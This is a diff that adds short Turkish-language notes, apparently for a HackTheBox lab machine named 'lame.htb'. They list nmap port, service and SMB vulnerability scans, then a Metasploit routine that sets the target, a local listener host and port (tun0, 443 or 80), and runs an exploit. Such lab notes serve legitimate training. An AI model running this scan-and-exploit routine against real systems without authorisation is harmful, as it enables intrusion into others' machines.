@@ -1,0 +1,25 @@
+nano /etc/hosts -> ip ye isim ata
+
+
+nmap -Pn -n --top-ports 1000 -oN 1kScan -T4 <ip> -> en popüler 1000 portu incele
+
+nmap -Pn -n -p- -oN FullScan lame.htb -T5 -> tüm portları incele
+
+
+DURUMA BAĞLI
+(
+	nmap -Pn -n -A -p <port>,<port>... <ip> -oN AScan -> sistem bilgileri
+	nmap -Pn -n --script=smb-vuln* <ip> -oN VulnScan445 p <port> -> 445 portundan script 		çalıştırıp açıkları bulma
+
+	Açık bulduktan sonra
+
+	searchsploit <açık ismi>
+	msfconsole (metasploit konsolunu açar)
+	search <açık ismi>
+	use <kullanılıcak exploit>
+	options
+	set rhosts <karşı makine ip>
+	set lhost <kendi ip//tun0>
+	set lport <port//443//80>
+	exploit
+)	
